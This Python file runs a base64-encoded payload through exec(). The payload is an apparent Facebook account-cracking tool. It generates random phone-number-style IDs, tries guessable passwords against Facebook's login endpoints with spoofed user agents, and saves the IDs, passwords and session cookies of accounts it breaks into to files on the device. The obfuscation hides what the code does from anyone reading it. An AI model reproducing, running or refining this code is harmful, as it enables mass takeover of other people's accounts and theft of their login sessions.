import base64
exec(base64.b64decode('I1M5VVI5QkgNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBqc29uDQppbXBvcnQgdXVpZA0KaW1wb3J0IHN0cmluZw0KaW1wb3J0IHJhbmRvbSxwbGF0Zm9ybSxzdWJwcm9jZXNzLGhhc2hsaWINCmltcG9ydCByZXF1ZXN0cyxyZSx0aW1lDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHRyZWQNCmNsYXNzIE1yX0NvZGU6DQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmxvb3AgPSAwDQogICAgICAgIHNlbGYub2tzID0gW10NCiAgICAgICAgc2VsZi5jcHMgPSBbXQ0KICAgICAgICBzZWxmLmdlbiA9IFtdICAgICAgICANCiAgICANCiAgICBkZWYgYmFubmVyKHNlbGYpOg0KICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIiBpZiBvcy5uYW1lICE9ICJudCIgZWxzZSAiY2xzIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN20iKQ0KICAgICAgICBwcmludCgiICAgIC5kOGIgICBkYiAgICBkYiAuZDg4ODggICIpDQogICAgICAgIHByaW50KCIgICBkOCcgYDhiIGA4YiAgZDgnIDg4JyAgWVAgICAiKQ0KICAgICAgICBwcmludCgiICAgODhvb284OCAgYDhiZDgnICBgOGJvICAgICAiKQ0KICAgICAgICBwcmludCgiICAgODh+fn44OCAgLmRQWWIgICAgIGBZOGIgICAgICIpDQogICAgICAgIHByaW50KCIgICA4OCAgIDg4IC44UCAgWTggIGRiICAgOEQgICAiKQ0KICAgICAgICBwcmludCgiICAgWVAgICBZUCBZUCAgICBZUCBgODg4OFknIFwwMzNbMTszMm1TNFVSNEJIIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMzg7NTsyNTBt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszMm0gIBogXDAzM1sxOzM3bVRvb2wgT3duZXIgXDAzM1szODs1OzIwOG0aICBcMDMzWzE7MzdtU2F1cmFiaCBLdW1hciBNZWVuYSIpDQogICAgICAgIHByaW50KCJcMDMzWzE7MzJtICAaIFwwMzNbMTszN21HaXRIdWIgICAgIFwwMzNbMzg7NTsyMDhtGiAgXDAzM1sxOzM3bWh0dHBzOi8vZ2l0aHViLmNvbS9CQUJVLVhEIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszMm0gIBogXDAzM1sxOzM3bVR5cGUgICAgICAgXDAzM1szODs1OzIwOG0aICBcMDMzWzE7MzdtUmFuZG9tIikNCiAgICAgICAgcHJpbnQoIlwwMzNbMTszMm0gIBogXDAzM1sxOzM3bVZlcnNpb24gICAgXDAzM1szODs1OzIwOG0aICBcMDMzWzE7MzltWzAuOfCfpotdIikNCiAgICAgICAgcHJpbnQoIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpDQogICAgIyBkZWYgbWV0aG9kKHNlbGYsIHVpZCwgcGFzc2xpc3QpOg0KICAgICMgICAgIGZvciBwdyBpbiBwYXNzbGlzdDoNCiAgICAjICAgICAgICAgIyBEdW1teSBzaW11bGF0aW9uIO+/vSByZXBsYWNlIHdpdGggYWN0dWFsIGxvZ2luIGxvZ2ljDQogICAgIyAgICAgICAgIHByaW50KGYiW1RSWUlOR10ge3VpZH0gfCB7cHd9IikNCiAgICAjICAgICAgICAgaWYgcHcuZW5kc3dpdGgoIjAwIik6ICAjIFNpbXVsYXRlZCAiT0siIGNvbmRpdGlvbg0KICAgICMgICAgICAgICAgICAgcHJpbnQoZiJbT0tdIHt1aWR9IHwge3B3fSIpDQogICAgIyAgICAgICAgICAgICBzZWxmLm9rcy5hcHBlbmQodWlkKQ0KICAgICMgICAgICAgICAgICAgYnJlYWsNCiAgICAjICAgICAgICAgZWxzZToNCiAgICAjICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgIyAgICAgZWxzZToNCiAgICAjICAgICAgICAgcHJpbnQoZiJbQ1BdIHt1aWR9IHwge3Bhc3NsaXN0WzBdfSIpDQogICAgIyAgICAgICAgIHNlbGYuY3BzLmFwcGVuZCh1aWQpDQogICAgZGVmIE1haW4oc2VsZik6DQogICAgICAgIHNlbGYuYmFubmVyKCkNCiAgICAgICAgY29kZSA9IGlucHV0KCIgICBDaG9vc2UgQ29kZSAtICAiKS5zdHJpcCgpDQogICAgICAgIGxpbWl0ID0gaW50KGlucHV0KCIgICBZb3VyIExpbWl0ICAtICAiKS5zdHJpcCgpKQ0KICAgICAgICBwcmludCgi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikNCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UobGltaXQpOg0KICAgICAgICAgICAgcmFuZF82ZGlnaXQgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNikpDQogICAgICAgICAgICBzZWxmLmdlbi5hcHBlbmQocmFuZF82ZGlnaXQpDQogICAgICAgIHByaW50KCIgICBUVVJOIE9OL09GRiBGTElHSFQgTU9ERVxuIikNCiAgICAgICAgcHJpbnQoIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpDQogICAgICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz0zMCkgYXMgZXhlY3V0b3I6DQogICAgICAgICAgICBmb3IgbnVtYmVyIGluIHNlbGYuZ2VuOg0KICAgICAgICAgICAgICAgIHVpZCA9IGNvZGUgKyBudW1iZXINCiAgICAgICAgICAgICAgICBwYXNzbGlzdCA9IFt1aWRbOjZdLCB1aWQsIHVpZFs6OF0sIG51bWJlcls6Nl0sICI1NzI3MzIwMCJdDQogICAgICAgICAgICAgICAgZXhlY3V0b3Iuc3VibWl0KHNlbGYubWV0aG9kLCB1aWQsIHBhc3NsaXN0KQ0KDQogICAgICAgIHByaW50KCJcbkNMT05JTkcgQ09NUExFVEUuIikNCiAgICAgICAgcHJpbnQoZiJUT1RBTCBPSzoge2xlbihzZWxmLm9rcyl9IikNCiAgICAgICAgcHJpbnQoZiJUT1RBTCBDUDoge2xlbihzZWxmLmNwcyl9IikNCiAgICAgICAgcHJpbnQoIuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpDQogICAgDQogICAgZGVmIG1ldGhvZChzZWxmLGlkcyxwYXNzbGlzdCk6DQogICAgICAgIGdsb2JhbCBsb29wLG9rcyxjcHMNCiAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAjZyA9IHJhbmRvbS5jaG9pY2Uoc2Ftc3VuZ191c2VyX2FnZW50KCkpDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcclxyXHgxYlttICBcMDMzWzM4OzU7MjA4bRogW0FYU11cMDMzWzM5OzU7MjA4bRp8e3NlbGYubG9vcH18T0s6LXtsZW4oc2VsZi5va3MpfXxDUDote2xlbihzZWxmLmNwcyl9IikNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBwYXMgaW4gcGFzc2xpc3Q6DQogICAgICAgICAgICAgICAgYmFsID0gImh0dHBzOi8vdG91Y2guZmFjZWJvb2suY29tLyINCiAgICAgICAgICAgICAgICBib3JvX2JhcmEgPSBzZXNzaW9uLmdldChiYWwpDQogICAgICAgICAgICAgICAgbG9kYV9MZWdhID0geydtX3RzJzogcmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJyxzdHIoYm9yb19iYXJhLnRleHQpKS5ncm91cCgxKSwgJ2xpJzogcmUuc2VhcmNoKCduYW1lPSJsaSIgdmFsdWU9IiguKj8pIicsc3RyKGJvcm9fYmFyYS50ZXh0KSkuZ3JvdXAoMSksICd0cnlfbnVtYmVyJzogJzAnLCAndW5yZWNvZ25pemVkX3RyaWVzJzogJzAnLCAnZW1haWwnOiBpZHMsICdwcmVmaWxsX2NvbnRhY3RfcG9pbnQnOiAnJywgJ3ByZWZpbGxfc291cmNlJzogJycsICdwcmVmaWxsX3R5cGUnOiAnJywgJ2ZpcnN0X3ByZWZpbGxfc291cmNlJzogJycsICdmaXJzdF9wcmVmaWxsX3R5cGUnOiAnJywgJ2hhZF9jcF9wcmVmaWxsZWQnOiAnZmFsc2UnLCAnaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCc6ICdmYWxzZScsICdpc19zbWFydF9sb2NrJzogJ2ZhbHNlJywgJ2JpX3hyd2gnOiAnMCcsICdlbmNwYXNzJzogIiNQV0RfQlJPV1NFUjowOnt9Ont9Ii5mb3JtYXQoc3RyKHRpbWUudGltZSgpKS5zcGxpdCgnLicpWzBdLCBwYXMpLCAnYmlfd3ZkcCc6ICcnLCAnZmJfZHRzZyc6ICcnLCAnamF6b2VzdCc6IHJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsc3RyKGJvcm9fYmFyYS50ZXh0KSkuZ3JvdXAoMSksICdsc2QnOiByZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsc3RyKGJvcm9fYmFyYS50ZXh0KSkuZ3JvdXAoMSksICdfX2R5bic6ICcnLCAnX19jc3InOiAnJywgJ19fcmVxJzogcmFuZG9tLmNob2ljZShbIjEiLCIyIiwiMyIsIjQiLCI1IiwiNiIsIjciLCI4IiwiOSIsIjAiXSksICdfX2ZtdCc6ICcwJywgJ19fYSc6ICcnLCAgJ19fdXNlcic6ICcwJ30NCiAgICAgICAgICAgICAgICBhY2hoYSA9IHsNCiAgICAgICAgICAgICAgICAnYXV0aG9yaXR5JzogJ3d3dy5mYWNlYm9vay5jb20nLA0KICAgICAgICAgICAgICAgICdtZXRob2QnOiAnUE9TVCcsDQogICAgICAgICAgICAgICAgJ3BhdGgnOiAnL2FzeW5jL3dibG9rcy9mZXRjaC8/YXBwaWQ9Y29tLmJsb2tzLnd3dy5ibG9rcy5jYWEubG9naW4uYXN5bmMuc2VuZF9sb2dpbl9yZXF1ZXN0JnR5cGU9YWN0aW9uJl9fYmt2PTcwMmMyZjY4NGU1Y2I5MTQxNWZmNzNlYTA0YzZiODJkNTU4MDQ4N2ZiZDBhOTA5NzU3NjViMGFkZWU1MDA5NDAnLA0KICAgICAgICAgICAgICAgICdzY2hlbWUnOiAnaHR0cHMnLA0KICAgICAgICAgICAgICAgICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43JywNCiAgICAgICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44JywNCiAgICAgICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgnLA0KICAgICAgICAgICAgICAgICdkcHInOiAnMycsDQogICAgICAgICAgICAgICAgJ29yaWdpbic6ICdodHRwczovL20uZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luLnBocD9za2lwX2FwaV9sb2dpbj0xJmFwaV9rZXk9NjUyMDYwNTY4MjQma2lkX2RpcmVjdGVkX3NpdGU9MCZhcHBfaWQ9NjUyMDYwNTY4MjQmc2lnbmVkX25leHQ9MSZuZXh0PWh0dHBzJTNBJTJGJTJGd3d3LmZhY2Vib29rLmNvbSUyRnYyMS4wJTJGZGlhbG9nJTJGb2F1dGglM0ZhcHBfaWQlM0Q2NTIwNjA1NjgyNCUyNmF1dGhfdHlwZSUzRHJlcmVxdWVzdCUyNmNidCUzRDE3NDE0MTU5NjQzMzklMjZjaGFubmVsX3VybCUzRGh0dHBzJTI1M0ElMjUyRiUyNTJGc3RhdGljeHguZmFjZWJvb2suY29tJTI1MkZ4JTI1MkZjb25uZWN0JTI1MkZ4ZF9hcmJpdGVyJTI1MkYlMjUzRnZlcnNpb24lMjUzRDQ2JTI1MjNjYiUyNTNEZjFlYjYwMjY1OTkzNWY4OTQlMjUyNmRvbWFpbiUyNTNEbnoudHJ1c3RwaWxvdC5jb20lMjUyNmlzX2NhbnZhcyUyNTNEZmFsc2UlMjUyNm9yaWdpbiUyNTNEaHR0cHMlMjUyNTNBJTI1MjUyRiUyNTI1MkZuei50cnVzdHBpbG90LmNvbSUyNTI1MkZmNWQwYzI1NzU2YmRkNmY0MiUyNTI2cmVsYXRpb24lMjUzRG9wZW5lciUyNmNsaWVudF9pZCUzRDY1MjA2MDU2ODI0JTI2ZGlzcGxheSUzRHBvcHVwJTI2ZG9tYWluJTNEbnoudHJ1c3RwaWxvdC5jb20lMjZlMmUlM0QlMjU3QiUyNTdEJTI2ZmFsbGJhY2tfcmVkaXJlY3RfdXJpJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkZuei50cnVzdHBpbG90LmNvbSUyNTJGdXNlcnMlMjUyRmNvbm5lY3QlMjUzRnJlZGlyZWN0JTI1M0QlMjUyNTJmcmV2aWV3JTI1MjUyZmZyeTk5LmNvbSUyNTI2c291cmNlX2N0YSUyNTNEaGVhZGVyJTI2bG9jYWxlJTNEZW5fVVMlMjZsb2dnZXJfaWQlM0RmYzY4OGIzMWYyZjEyZjUxYiUyNm9yaWdpbiUzRDElMjZyZWRpcmVjdF91cmklM0RodHRwcyUyNTNBJTI1MkYlMjUyRnN0YXRpY3h4LmZhY2Vib29rLmNvbSUyNTJGeCUyNTJGY29ubmVjdCUyNTJGeGRfYXJiaXRlciUyNTJGJTI1M0Z2ZXJzaW9uJTI1M0Q0NiUyNTIzY2IlMjUzRGZhYzJmYzM5MmI1OTUyYTlmJTI1MjZkb21haW4lMjUzRG56LnRydXN0cGlsb3QuY29tJTI1MjZpc19jYW52YXMlMjUzRGZhbHNlJTI1MjZvcmlnaW4lMjUzRGh0dHBzJTI1MjUzQSUyNTI1MkYlMjUyNTJGbnoudHJ1c3RwaWxvdC5jb20lMjUyNTJGZjVkMGMyNTc1NmJkZDZmNDIlMjUyNnJlbGF0aW9uJTI1M0RvcGVuZXIlMjUyNmZyYW1lJTI1M0RmMmRlN2E0MTVkZGYzNWY4MyUyNnJlc3BvbnNlX3R5cGUlM0R0b2tlbiUyNTJDc2lnbmVkX3JlcXVlc3QlMjUyQ2dyYXBoX2RvbWFpbiUyNnJldHVybl9zY29wZXMlM0R0cnVlJTI2c2NvcGUlM0RwdWJsaWNfcHJvZmlsZSUyNTJDZW1haWwlMjZzZGslM0Rqb2V5JTI2dmVyc2lvbiUzRHYyMS4wJTI2cmV0JTNEbG9naW4lMjZmYmFwcF9wcmVzJTNEMCUyNnRwJTNEdW5zcGVjaWZpZWQmY2FuY2VsX3VybD1odHRwcyUzQSUyRiUyRnN0YXRpY3h4LmZhY2Vib29rLmNvbSUyRnglMkZjb25uZWN0JTJGeGRfYXJiaXRlciUyRiUzRnZlcnNpb24lM0Q0NiUyM2NiJTNEZmFjMmZjMzkyYjU5NTJhOWYlMjZkb21haW4lM0Ruei50cnVzdHBpbG90LmNvbSUyNmlzX2NhbnZhcyUzRGZhbHNlJTI2b3JpZ2luJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkZuei50cnVzdHBpbG90LmNvbSUyNTJGZjVkMGMyNTc1NmJkZDZmNDIlMjZyZWxhdGlvbiUzRG9wZW5lciUyNmZyYW1lJTNEZjJkZTdhNDE1ZGRmMzVmODMlMjZlcnJvciUzRGFjY2Vzc19kZW5pZWQlMjZlcnJvcl9jb2RlJTNEMjAwJTI2ZXJyb3JfZGVzY3JpcHRpb24lM0RQZXJtaXNzaW9ucyUyQmVycm9yJTI2ZXJyb3JfcmVhc29uJTNEdXNlcl9kZW5pZWQmZGlzcGxheT1wb3B1cCZsb2NhbGU9Ym5fSU4mcGxfZGJsPTAnLA0KICAgICAgICAgICAgICAgICdzZWMtY2gtcHJlZmVycy1jb2xvci1zY2hlbWUnOiAnbGlnaHQnLA0KICAgICAgICAgICAgICAgICdzZWMtY2gtdWEnOiAnIkNocm9taXVtIjt2PSIxMzciLCAiTm90L0EpQnJhbmQiO3Y9IjI0IicsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1mdWxsLXZlcnNpb24tbGlzdCc6ICciQ2hyb21pdW0iO3Y9IjEzNy4wLjczMzcuMCIsICJOb3QvQSlCcmFuZCI7dj0iMjQuMC4wLjAiJywNCiAgICAgICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2RlbCc6ICciUTkiJywNCiAgICAgICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJXaW5kb3dzIicsDQogICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybS12ZXJzaW9uJzogJyIxMi4wLjAiJywNCiAgICAgICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLA0KICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywNCiAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLA0KICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsDQogICAgICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBnZW5lcmF0ZV9taXhlZF91YSgpLA0KICAgICAgICAgICAgICAgICd2aWV3cG9ydC13aWR0aCc6ICc5ODAnLH0NCiAgICAgICAgICAgICAgICBtZVJhX0xpbmsgPSAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmbG9naW5fZnJvbV9heW1oPTEmcmVmaWQ9OCINCiAgICAgICAgICAgICAgICBzZXNzaW9uLnBvc3QodXJsPW1lUmFfTGluayxkYXRhPWxvZGFfTGVnYSxoZWFkZXJzPWFjaGhhKQ0KICAgICAgICAgICAgICAgIGxvZ19jb29raWVzID0gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkua2V5cygpDQogICAgICAgICAgICAgICAgaWYgImNfdXNlciIgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgICAgIGt1a2kgPSAiOyIuam9pbihbZiJ7a2V5fT17c2Vzc2lvbi5jb29raWVzLmdldChrZXkpfSIgZm9yIGtleSBpbiBbJ2RhdHInLCAnZnInLCAnc2InLCAnY191c2VyJywgJ3hzJ11dKQ0KICAgICAgICAgICAgICAgICAgICB1c2VyID0gcmUuZmluZGFsbCgnY191c2VyPSguKik7eHMnLCBrdWtpKVswXQ0KICAgICAgICAgICAgICAgICAgICByZXEgPSByZXF1ZXN0cy5nZXQoZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dXNlcn0vcGljdHVyZT90eXBlPW5vcm1hbCIpLnRleHQNCiAgICAgICAgICAgICAgICAgICAgaWYgIlBob3Rvc2hvcCIgaW4gcmVxOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcclxyXHgxYlszODs1OzQ2bU9LIOKAoiB7dXNlcn0g4oCiIHtwYXN9IikNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXDAzM1szODs1OzIyMG1Db29raWVzOlwwMzNbMG0ge2t1a2l9IikNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oIi9zZGNhcmQvQVhTLU9LLnR4dCIsICJhIikud3JpdGUodXNlciArICJ8IiArIHBhcyArICJ8IiArIGt1a2kgKyAiXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5va3MuYXBwZW5kKHVzZXIpDQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgImNoZWNrcG9pbnQiIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgICAgICBvcGVuKCIvc2RjYXJkL0FYUy1DUC50eHQiLCAiYSIpLndyaXRlKGlkcyArICJ8IiArIHBhcyArICJcbiIpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3BzLmFwcGVuZChpZHMpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIHNlbGYubG9vcCArPSAxDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgICAgICBwYXNzDQogICANCmdlbmVyYXRlX21peGVkX3VhPVtdDQppbXBvcnQgcmFuZG9tDQoNCmRlZiBnZW5lcmF0ZV9taXhlZF91YSgpOg0KICAgIGFuZHJvaWRfdmVyc2lvbnMgPSBbIjEwIiwgIjExIiwgIjEyIiwgIjEzIiwgIjE0Il0NCiAgICBjaHJvbWVfdmVyc2lvbnMgPSBbZiJ7cmFuZG9tLnJhbmRpbnQoMTAwLDEyNil9LjAue3JhbmRvbS5yYW5kaW50KDEwMDAsNTk5OSl9LntyYW5kb20ucmFuZGludCgxMCwxNTApfSJdDQoNCiAgICBhbmRyb2lkX2RldmljZXMgPSBbDQogICAgICAgICJSTVgiK3N0cihyYW5kb20ucmFuZGludCgxOTAwLDYwMDApKSwNCiAgICAgICAgIlNNLSIrcmFuZG9tLmNob2ljZShbIkEiLCJNIiwiTiJdKStzdHIocmFuZG9tLnJhbmRpbnQoMTAwLDk5OSkpLA0KICAgICAgICAiSVFPTyAiK3N0cihyYW5kb20ucmFuZGludCgxMCwyMCkpLA0KICAgICAgICAiVml2byAiK3N0cihyYW5kb20ucmFuZGludCgxODAwLDIzMDApKSwNCiAgICAgICAgIkluZmluaXgtIitzdHIocmFuZG9tLnJhbmRpbnQoNjAwLDkwMCkpLA0KICAgICAgICAiUmVkbWkgIitzdHIocmFuZG9tLnJhbmRpbnQoNSwxMikpLA0KICAgICAgICAiTTIwIitzdHIocmFuZG9tLnJhbmRpbnQoMCw5KSkNCiAgICBdDQoNCiAgICB3aW5kb3dzX3ZlcnNpb25zID0gWw0KICAgICAgICAiV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0IiwNCiAgICAgICAgIldpbmRvd3MgTlQgMTAuMDsgV09XNjQiLA0KICAgICAgICAiV2luZG93cyBOVCAxMS4wOyBXaW42NDsgeDY0Ig0KICAgIF0NCg0KICAgIG1hY192ZXJzaW9ucyA9IFsNCiAgICAgICAgIk1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfIitzdHIocmFuZG9tLnJhbmRpbnQoMTAsMTUpKSsiXyIrc3RyKHJhbmRvbS5yYW5kaW50KDAsOSkpLA0KICAgIF0NCg0KICAgIHVhX3R5cGVzID0gWyJhbmRyb2lkIiwgIndpbmRvd3MiLCAibWFjIl0NCiAgICBjaG9pY2UgPSByYW5kb20uY2hvaWNlKHVhX3R5cGVzKQ0KDQogICAgaWYgY2hvaWNlID09ICJhbmRyb2lkIjoNCiAgICAgICAgdWEgPSAoZiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge3JhbmRvbS5jaG9pY2UoYW5kcm9pZF92ZXJzaW9ucyl9OyAiDQogICAgICAgICAgICAgIGYie3JhbmRvbS5jaG9pY2UoYW5kcm9pZF9kZXZpY2VzKX0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pICINCiAgICAgICAgICAgICAgZiJDaHJvbWUve3JhbmRvbS5jaG9pY2UoY2hyb21lX3ZlcnNpb25zKX0gTW9iaWxlIFNhZmFyaS81MzcuMzYiKQ0KICAgIGVsaWYgY2hvaWNlID09ICJ3aW5kb3dzIjoNCiAgICAgICAgdWEgPSAoZiJNb3ppbGxhLzUuMCAoe3JhbmRvbS5jaG9pY2Uod2luZG93c192ZXJzaW9ucyl9KSAiDQogICAgICAgICAgICAgIGYiQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgIg0KICAgICAgICAgICAgICBmIkNocm9tZS97cmFuZG9tLmNob2ljZShjaHJvbWVfdmVyc2lvbnMpfSBTYWZhcmkvNTM3LjM2IikNCiAgICBlbHNlOg0KICAgICAgICB1YSA9IChmIk1vemlsbGEvNS4wICh7cmFuZG9tLmNob2ljZShtYWNfdmVyc2lvbnMpfSkgIg0KICAgICAgICAgICAgICBmIkFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgIg0KICAgICAgICAgICAgICBmIlZlcnNpb24vMTUuMSBTYWZhcmkvNjA1LjEuMTUiKQ0KDQogICAgcmV0dXJuIHVhDQojIFN0YXJ0IHRoZSBzY3JpcHQNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgTXJfQ29kZSgpLk1haW4oKQ==').decode())